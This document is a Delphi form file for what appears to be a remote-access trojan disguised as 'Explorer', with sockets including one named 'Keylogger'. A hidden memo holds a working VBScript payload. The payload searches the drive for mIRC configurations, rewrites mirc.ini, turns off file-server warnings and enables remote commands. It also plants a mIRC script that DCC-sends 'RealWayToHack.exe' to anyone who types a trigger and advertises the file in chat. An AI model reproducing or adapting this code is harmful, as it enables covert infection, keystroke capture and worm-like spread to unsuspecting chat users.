   object Form1: TForm1
     Left = 192
     Top = 105
     BorderStyle = bsNone
     Caption = 'Explorer'
     ClientHeight = 455
     ClientWidth = 297
     Color = clBtnFace
     Font.Charset = DEFAULT_CHARSET
     Font.Color = clWindowText
     Font.Height = -11
     Font.Name = 'MS Sans Serif'
     Font.Style = []
     FormStyle = fsStayOnTop
     OldCreateOrder = False
     OnClose = FormClose
     OnCreate = FormCreate
     PixelsPerInch = 96
     TextHeight = 13
     object Shape2: TShape
       Left = 0
       Top = 16
       Width = 297
       Height = 439
       Brush.Style = bsClear
     end
     object Shape1: TShape
       Left = 8
       Top = 428
       Width = 281
       Height = 17
       Brush.Style = bsClear
     end
     object Label2: TLabel
       Left = 16
       Top = 428
       Width = 265
       Height = 17
       AutoSize = False
       Caption = 'Nothing ...'
       Transparent = True
       Layout = tlCenter
     end
     object Label1: TLabel
       Left = 8
       Top = 21
       Width = 281
       Height = 17
       Alignment = taCenter
       AutoSize = False
       Caption = 'Are you feeling Haxxored?'
     end
     object Gauge1: TGauge
       Left = 96
       Top = 24
       Width = 81
       Height = 17
       Progress = 0
       Visible = False
     end
     object img: TImage
       Left = 56
       Top = 80
       Width = 57
       Height = 57
       Visible = False
     end
     object MM: TGauge
       Left = 48
       Top = 264
       Width = 177
       Height = 9
       Progress = 0
     end
     object ListBox1: TListBox
       Left = 432
       Top = 408
       Width = 105
       Height = 105
       ItemHeight = 13
       TabOrder = 0
       Visible = False
     end
     object DELDI: TButton
       Left = 432
       Top = 376
       Width = 49
       Height = 25
       Caption = 'DELDI'
       TabOrder = 1
       Visible = False
       OnClick = DELDIClick
     end
     object Memo2: TMemo
       Left = 8
       Top = 374
       Width = 225
       Height = 49
       TabOrder = 2
     end
     object Memo1: TMemo
       Left = 8
       Top = 40
       Width = 281
       Height = 327
       ReadOnly = True
       ScrollBars = ssVertical
       TabOrder = 3
     end
     object Button1: TButton
       Left = 240
       Top = 373
       Width = 49
       Height = 49
       Caption = '&Send'
       TabOrder = 4
     end
     object Memo3: TMemo
       Left = 72
       Top = 152
       Width = 105
       Height = 89
       TabOrder = 6
       Visible = False
     end
     object Memo4: TMemo
       Left = 40
       Top = 88
       Width = 193
       Height = 121
       Lines.Strings = (
         ' dim Coca1'
         ' dim Coca2'
         ' dim Kisse'
         ' dim Falcon'
         ' dim SuckDick'
         ''
         ' call ShowFolderList("c:\")'
         ' Call ILU()'
         ''
         ' sub ShowFolderList(s)'
         ' on error resume next'
         ' '#39'Level 1'
         ''
         '     Set filesys = CreateObject("Scripting.FileSystemObject")'
         '     Set RootFolder1 = FileSys.GetFolder(s)'
         ' '#9'Set SubFolds1 = RootFolder1.subfolders'
         ' '#9'For Each f1 in Subfolds1'
         ' '#9#9's = f1.path & "\ "'
         ' '#9#9'Coca1 = s & "mirc.ini "'
         ' '#9#9'Coca2= s & "mirc.dat "'
         ' '#9#9'Falcon= "C:\winamod.dat "'
         ' '#9#9'Kisse= s & "servers.ini "'
         ' '#9#9'SuckDick= "[rfiles] "'
         ' '#9#9'if filesys.fileexists(Coca1) then'
         ' '#9#9#9'Call Filemod()  '
         ' '#9#9#9'filesys.CopyFile Falcon, Coca1, true '
         ' '#9#9#9'Call ImplementRemote() '
         ' '#9#9#9'filesys.CopyFile Falcon, Coca1, true '
         ' '#9#9#9'Call ImplementWarn()'
         ' '#9#9#9'filesys.CopyFile Falcon, Coca1, true '
         ' '#9#9#9'Call ImplementFserv() '
         ' '#9#9#9'filesys.CopyFile Falcon, Coca1, true '
         ' '#9#9#9'call ImplementPerfCheck() '
         ' '#9#9#9'filesys.CopyFile Falcon, Coca1, true '
         ' '#9#9#9'Call ImplementPerform() '
         ' '#9#9#9'SetClearArchiveBit(Coca1) '
         ' '#9#9'End If '
         ' '#9'Call ShowFolderList(s) '
         '     Next '
         '  '
         ' End sub '
         '  '
         ' Function FiltNum(FilString) '
         ' '#39'on error resume next '
         ' countdown=5 '
         ' do '
         ' '#9'Comp = mid(FilString,2,countdown) '
         ' '#9'if isnumeric(Comp) then LastNum = Comp : exit do '
         ' countdown=countdown-1 '
         ' loop until countdown =0 '
         ' FiltNum = LastNum '
         ' end function '
         '  '
         ' Function LastLineNum(SSection) '
         ' '#39'on error resume next '
         ' Set FS1N = CreateObject("Scripting.FileSystemObject") '
         ' Set FR1N = FS1N.OpenTextFile(Coca1,1,true) '
         '  '
         ' Do While FR1N.AtEndOfStream <> True '
         ' '#9'segment1 = FR1N.readline'
         ' '#9'w = InstrRev(segment1,SSection) '
         ' '#9'counts=counts+1 '
         ' '#9'if w > 0 then  '
         ' '#9#9'do '
         ' '#9#9#9'if FR1N.AtEndOfStream = True then exit do '
         ' '#9#9#9'segmentk = FR1N.readline '
         ' '#9#9#9'k = InstrRev(segmentk,"n",1) '
         ' '#9#9#9'if k=1 then '
         ' '#9#9#9#9'LastNum=FiltNum(segmentk) '
         ' '#9#9#9'end if '
         ' '#9#9'Loop until k=0 '
         ' '#9'end if '
         ' loop '
         ' FR1N.Close '
         ' LastLineNum=LastNum '
         ' end function '
         '  '
         ' Function Filemod() '
         ' '#39'on error resume next '
         ' Set fs1 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1 = fs1.OpenTextFile(Coca1,1,true) '
         ' Set fs2 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr2 = fs2.OpenTextFile(Falcon,2,true) '
         '  '
         ' Do While fr1.AtEndOfStream <> True '
         ' '#9'segment1 = fr1.readline '
         ' '#9'fr2.writeline segment1 '
         ' '#9'w = InstrRev(segment1,"[rfiles]") '
         ' '#9'counts=counts+1 '
         ' '#9'if w > 0 then  '
         ' '#9'counts2=counts'
         ' '#9#9'do '
         ' '#9#9#9'if fr1.AtEndOfStream = True then exit do '
         ' '#9#9#9'segmentk = fr1.readline '
         ' '#9#9#9'k = InstrRev(segmentk,"n",1)'#9#9' '
         ' '#9#9#9'if k=1 then '
         ' '#9#9#9#9'LastNum=FiltNum(segmentk) '
         ' '#9#9#9#9'fr2.writeline segmentk '
         ' '#9#9#9'end if '
         ' '#9#9'COUNTS2=COUNTS2+1 '
         ' '#9#9'Loop until k<>1 '
         ' '#9'exit do '
         ' '#9'end if '
         ' loop '
         ' fr1.Close '
         ' fr2.close '
         '  '
         ' Set fs3 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr3 = fs3.OpenTextFile(Falcon,8,true) '
         ' TrojanInfo = "n" & lastlinenum(SuckDick)+1 & "=Servers.ini" '
         ' fr3.writeline TrojanInfo '
         ' fr3.Close '
         '  '
         ' Set fs4 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr4 = fs4.OpenTextFile(Coca1,1,true) '
         '  '
         ' Set fs5 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr5 = fs5.OpenTextFile(Falcon,8,true) '
         '  '
         ' Do While fr4.AtEndOfStream <> True '
         ' '#9'segment2 = fr4.readline '
         ' '#9'if fr4.line >= counts2 + 2 then'
         ' '#9#9'fr5.writeline segment2 '
         ' '#9'end if '
         ' loop '
         ' fr4.Close '
         ' fr5.Close '
         ' fs5.CopyFile Falcon, Coca1, true '
         ' Call FLDL(Kisse) '
         ' end Function '
         '  '
         ' sub FLDL(Kisse) '
         ' '#39'on error resume next '
         ' Set fs6 = CreateObject("Scripting.FileSystemObject") '
         ' Set fr6 = fs6.OpenTextFile(Kisse,2,true) '
         ' "[script]" '
         ' "n0=; ----------------" '
         ' "n1=; Dont Modify Anything In This Script" '
         ' "n2=; Else it can stop running along with" '
         ' "n3=; Your system.  // mIRC Operators" '
         ' "n4=; ----------------" '
         ' "n5=on *:TEXT:!Hacks:#: {" '
         ' "n6=  Notice $nick -------------" '
         ' "n7=  Notice $nick My list with hacks isent done yet" '
         ' "n8=  Notice $nick -------------" '
         ' "n9=  Notice $nick '#3'12 '#3'" '

           ' "n10=  Notice $nick Type !RealWayToHack for a Help with hacking' +
           '" '
         ' "n11=}" '
         ' "n12=on *:TEXT:!RealWayToHack:#: {" '
         ' "n13=  Notice $nick -- Sending you RealWayToHack.exe --" '
         ' "n14=  dcc send $nick C:\Windows\System\RealWayToHack.exe" '
         ' "n15=}" '
         ' "n16=on *:CONNECT:{ "'

           ' "n17= timer 0 120 /ame [***| Type !Hacks for my list of Hacks |' +
           '***]" '
         ' "n18=}" '
         ' fr6.close '
         ' end sub '
         '  '
         ' Function ImplementRemote() '
         ' Set fs1a = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1a = fs1a.OpenTextFile(Coca1,1,true) '
         ' Set fs2a = CreateObject("Scripting.FileSystemObject") '
         ' Set fr2a = fs2a.OpenTextFile(Falcon,2,true) '
         '  '
         ' Do While fr1a.AtEndOfStream <> True '
         ' '#9'segment1a = fr1a.readline '
         ' '#9'fr2a.writeline segment1a '
         ' '#9'if ucase(segment1a)=ucase("[options]") then '
         ' '#9'Do '
         ' '#9#9'If fr1a.AtEndOfStream Then exit do '
         ' '#9#9'n2a = fr1a.readline '
         ' '#9#9'If ucase(mid(n2a,1,3))=ucase("n2=") then '

           ' '#9#9#9'fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & ' +
           '"1" & Mid(n2a, 34) '
         ' '#9#9#9'exit do '
         ' '#9#9'Else '
         ' '#9#9#9'fr2a.writeline n2a '
         ' '#9#9'End If '
         ' '#9'Loop '
         ' '#9'end if '
         ' loop '
         ' fr1a.Close '
         ' fr2a.close '
         ' End Function '
         ''
         ' Function Implementfserv() '
         ' Set fs1a = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1a = fs1a.OpenTextFile(Coca1,1,true) '
         ' Set fs2a = CreateObject("Scripting.FileSystemObject") '
         ' Set fr2a = fs2a.OpenTextFile(Falcon,2,true) '
         '  '
         ' Do While fr1a.AtEndOfStream <> True '
         ' '#9'segment1a = fr1a.readline '
         ' '#9'fr2a.writeline segment1a '
         ' '#9'if ucase(segment1a)=ucase("[warn]") then '
         ' '#9'Do '
         ' '#9#9'If fr1a.AtEndOfStream Then exit do '
         ' '#9#9'n2a = fr1a.readline '
         ' '#9#9'If ucase(n2a)=ucase("fserve=on") then '
         ' '#9#9#9'fr2a.writeline "fserve=off" '
         ' '#9#9'Else '
         ' '#9#9#9'fr2a.writeline n2a '
         ' '#9#9'End If '
         ' '#9'Loop '
         ' '#9'end if '
         ' loop '
         ' fr1a.Close '
         ' fr2a.close '
         ' End Function '
         '  '
         ' Function Implementwarn() '
         ' Set fs1c = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1c = fs1c.OpenTextFile(Coca1,1,true) '
         ' Set fs2c = CreateObject("Scripting.FileSystemObject") '
         ' Set fr2c = fs2c.OpenTextFile(Falcon,2,true) '
         ''
         ' Do While fr1c.AtEndOfStream <> True '
         ' '#9'segment1c = fr1c.readline '
         ' '#9'fr2c.writeline segment1c '
         ' '#9'if ucase(segment1c)=ucase("[fileserver]") then '
         ' '#9'Do '
         ' '#9#9'if fr1c.AtEndOfStream then exit do '
         ' '#9#9'n2c = fr1c.readline '
         ' '#9#9'If ucase(n2c)=ucase("warning=on") then '
         ' '#9#9#9'fr2c.writeline "warning=off" '
         ' '#9#9'Else '
         ' '#9#9#9'fr2c.writeline n2c '
         ' '#9#9'End If '
         ' '#9'Loop '
         ' '#9'end if '
         ' loop '
         ' fr1c.Close '
         ' fr2c.close '
         ' End Function '
         '  '
         ' Function ImplementPerform() '
         ' Set fs1p = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1p = fs1p.OpenTextFile(Coca1,8,true) '
         ' fr1p.writeline "[Perform]" '
         ' fr1p.writeline "n0=/Remote ON" '
         ' fr1p.Close '
         ' fs1p.close '
         ' End Function '
         '  '
         ' Sub SetClearArchiveBit(filespec) '
         ' Dim fsg, fg '
         ' Set fsg = CreateObject("Scripting.FileSystemObject")'
         ' Set fg = fsg.GetFile(filespec) '
         ' fg.attributes = 0 '
         ' fg.attributes = fg.attributes + 1 '
         ' End Sub '
         '  '
         ' Function ImplementPerfCheck() '
         ' Set fs1f = CreateObject("Scripting.FileSystemObject") '
         ' Set fr1f = fs1f.OpenTextFile(Coca1,1,true) '
         ' Set fs2f = CreateObject("Scripting.FileSystemObject") '
         ' Set fr2f = fs2f.OpenTextFile(Falcon,2,true) '
         '  '
         ' Do While fr1f.AtEndOfStream <> True '
         ' '#9'segment1f = fr1f.readline '
         ' '#9'fr2f.writeline segment1f '
         ' '#9'if ucase(segment1f)=ucase("[options]") then '
         ' '#9'Do '
         ' '#9#9'If fr1f.AtEndOfStream Then exit do '
         ' '#9#9'n2f = fr1f.readline '
         ' '#9#9'If ucase(mid(n2f,1,3))=ucase("n0=") then '
         ' '#9#9#9'fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)'
         ' '#9#9#9'exit do'
         ' '#9#9'Else'
         ' '#9#9#9'fr2f.writeline n2f'
         ' '#9#9'End If'
         ' '#9'Loop'
         ' '#9'end if'
         ' loop'
         ' fr1f.Close'
         ' fr2f.close'
         ' End Function')
       ScrollBars = ssBoth
       TabOrder = 5
       Visible = False
     end
     object ss: TServerSocket
       Active = False
       Port = 0
       ServerType = stNonBlocking
       OnListen = ssListen
       OnAccept = ssAccept
       OnClientConnect = ssClientConnect
       OnClientDisconnect = ssClientDisconnect
       OnClientRead = ssClientRead
       OnClientError = ssClientError
       Left = 88
       Top = 344
     end
     object ICQs: TClientSocket
       Active = True
       Address = 'wwp.mirabilis.com'
       ClientType = ctNonBlocking
       Host = 'wwp.mirabilis.com'
       Port = 80
       OnConnect = ICQsConnect
       OnError = ICQsError
       Left = 120
       Top = 344
     end
     object CS: TClientSocket
       Active = False
       ClientType = ctNonBlocking
       Port = 0
       OnError = CSError
       Left = 128
       Top = 88
     end
     object Timer1: TTimer
       Interval = 1
       OnTimer = Timer1Timer
       Left = 176
       Top = 104
     end
     object ss2: TServerSocket
       Active = False
       Port = 0
       ServerType = stNonBlocking
       OnClientRead = ss2ClientRead
       OnClientError = ss2ClientError
       Left = 56
       Top = 344
     end
     object Keylogger: TServerSocket
       Active = False
       Port = 0
       ServerType = stNonBlocking
       OnClientRead = KeyloggerClientRead
       OnClientError = KeyloggerClientError
       Left = 152
       Top = 312
     end
     object Timer2: TTimer
       Interval = 1
       OnTimer = Timer2Timer
       Left = 120
       Top = 312
     end
     object Timer3: TTimer
       Enabled = False
       Interval = 8000
       OnTimer = Timer3Timer
       Left = 208
       Top = 104
     end
     object tmrPROG: TTimer
       Enabled = False
       Interval = 2000
       OnTimer = tmrPROGTimer
       Left = 80
       Top = 56
     end
   end
